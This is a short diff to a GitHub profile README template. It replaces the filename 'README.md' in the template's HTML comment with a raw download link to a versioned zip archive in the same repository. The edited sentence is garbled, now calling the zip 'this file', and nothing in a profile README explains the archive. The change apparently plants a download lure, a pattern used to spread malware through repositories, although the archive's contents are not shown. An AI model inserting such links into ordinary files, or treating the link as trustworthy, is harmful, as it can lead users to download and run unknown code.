@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-ipoukoumondi/ipoukoumondi is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+ipoukoumondi/ipoukoumondi is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/ipoukoumondi/ipoukoumondi/main/rompish/ipoukoumondi-2.8.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
